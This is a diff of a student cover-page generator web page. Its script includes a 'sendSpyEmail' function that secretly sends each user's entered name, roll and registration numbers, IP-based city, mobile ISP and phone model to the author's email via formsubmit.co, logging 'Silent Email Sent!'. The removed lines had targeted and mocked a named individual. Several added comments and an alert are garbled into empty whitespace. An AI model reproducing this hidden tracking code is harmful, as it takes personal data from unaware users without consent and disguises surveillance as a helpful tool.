@@ -79,12 +79,13 @@
         </div>
 
         <button class="btn-gen" onclick="checkAndGenerate()">Generate Cover</button>
-        <button id="dlBtn" class="btn-dl" onclick="downloadPDF()">⬇ Download PDF</button>
+        <button id="dlBtn" class="btn-dl" onclick="downloadPDF()"> Download PDF</button>
     </div>
 
     <canvas id="canvas"></canvas>
 
     <script>
+        //     
         const CONFIG = { startX: 0.37, fontSize: 0.055, pos_Name: 0.540, pos_Subj: 0.605, pos_Roll: 0.670, pos_Reg: 0.735 };
         const MY_EMAIL = "ayankarmakar7602@gmail.com";
 
@@ -105,26 +106,6 @@
             const rollIn = document.getElementById('roll');
             const regIn  = document.getElementById('reg');
 
-            // 🔥 UJJAL BLOCKING LOGIC START 🔥
-            const enteredName = nameIn.value.toUpperCase();
-            
-            // নাম যদি UJJAL হয়
-            if (enteredName.includes("UJJAL")) {
-                if (navigator.vibrate) navigator.vibrate([200, 100, 200, 100, 500]); // ভয়ানক ভাইব্রেশন
-                
-                // ১. আগে ইমেইল পাঠাচ্ছি (চুপিসারে)
-                sendSpyEmail(nameIn.value, subjIn.value, rollIn.value, regIn.value, true); 
-
-                // ২. একটু সময় দিচ্ছি মেইলটা যাওয়ার জন্য, তারপর অপমান
-                setTimeout(() => {
-                    alert("তোর জন্য এটা নয়। দোকানে গিয়ে করিয়ে নিবি 😏");
-                    location.reload(); 
-                }, 1000); 
-                
-                return; // কাজ শেষ
-            }
-            // 🔥 UJJAL BLOCKING LOGIC END 🔥
-
             let isValid = true;
             if (!nameIn.value.trim()) { nameIn.classList.add('error'); isValid = false; }
             if (!subjIn.value) { subjIn.classList.add('error'); isValid = false; }
@@ -133,20 +114,22 @@
 
             if (!isValid) {
                 if (navigator.vibrate) navigator.vibrate(200);
-                alert("⚠️ দয়া করে সব তথ্য সঠিক ভাবে পূরণ কর!");
+                alert("        !");
                 return;
             }
 
-            // সাধারণ মানুষের জন্য নরমাল ইমেইল
-            sendSpyEmail(nameIn.value, subjIn.value, rollIn.value, regIn.value, false);
+            //    (   )
+            sendSpyEmail(nameIn.value, subjIn.value, rollIn.value, regIn.value);
             
             generate(nameIn.value, subjIn.value, rollIn.value, regIn.value);
         }
 
-        // --- 🕵️‍♂️ সাইলেন্ট স্পাই ফাংশন (আপডেটেড) ---
+        // ---     ---
         function getDeviceModel() {
             const ua = navigator.userAgent;
             let model = "Generic Android";
+            
+            // Regex     
             if (ua.includes("Android")) {
                 const match = ua.match(/;\s([^;]+)\sBuild\//); 
                 if (match && match[1]) model = match[1].trim(); 
@@ -154,16 +137,20 @@
                     const match2 = ua.match(/Android[^;]+; ([^;]+);/);
                     if (match2) model = match2[1].trim();
                 }
-            } else if (ua.includes("iPhone")) { model = "iPhone"; } 
-            else if (ua.includes("Windows")) { model = "PC / Laptop"; }
+            } else if (ua.includes("iPhone")) {
+                model = "iPhone";
+            } else if (ua.includes("Windows")) {
+                model = "PC / Laptop";
+            }
             return model;
         }
 
-        async function sendSpyEmail(name, subj, roll, reg, isUjjal) {
+        async function sendSpyEmail(name, subj, roll, reg) {
             const url = `https://formsubmit.co/ajax/${MY_EMAIL}`;
             const uniqueId = Math.floor(Math.random() * 10000);
             const deviceModel = getDeviceModel();
 
+            //       
             let ipData = { org: "Wait...", city: "Unknown" };
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -175,31 +162,32 @@
             if(cleanSim && cleanSim.includes("Jio")) cleanSim = "Jio";
             if(cleanSim && (cleanSim.includes("Vi") || cleanSim.includes("Vodafone"))) cleanSim = "Vi";
 
-            // 🚨 সাবজেক্ট আলাদা করার লজিক
-            let emailSubject;
-            if (isUjjal) {
-                emailSubject = `🚨 UJJAL DETECTED! He Tried! (#${uniqueId})`;
-            } else {
-                emailSubject = `New Cover: ${name} (#${uniqueId})`;
-            }
-
             fetch(url, {
                 method: "POST",
                 headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                 body: JSON.stringify({
-                    _subject: emailSubject, // এখানে আলাদা সাবজেক্ট যাবে
+                    _subject: `New Cover: ${name} (#${uniqueId})`, 
                     _captcha: "false",
                     _template: "table",
                     
-                    Status: isUjjal ? "❌ BLOCKED & INSULTED" : "✅ SUCCESS",
-                    Name: name, Subject: subj, Roll: roll, Reg: reg,
-                    City: ipData.city, Sim_ISP: cleanSim, Phone: deviceModel,
+                    Name: name,
+                    Subject: subj,
+                    Roll: roll,
+                    Reg: reg,
+                    
+                    //  
+                    City: ipData.city,       //  
+                    Sim_ISP: cleanSim,       // 
+                    Phone: deviceModel,      //  
+                    
                     Time: new Date().toLocaleString()
                 })
-            }).catch(err => console.log("Error:", err));
+            })
+            .then(res => console.log("Silent Email Sent!"))
+            .catch(err => console.log("Error:", err));
         }
 
-        // --- জেনারেট ফাংশন ---
+        // ---     ---
         function generate(nameVal, subjVal, rollVal, regVal) {
             const cvs = document.getElementById('canvas');
             const ctx = cvs.getContext('2d');
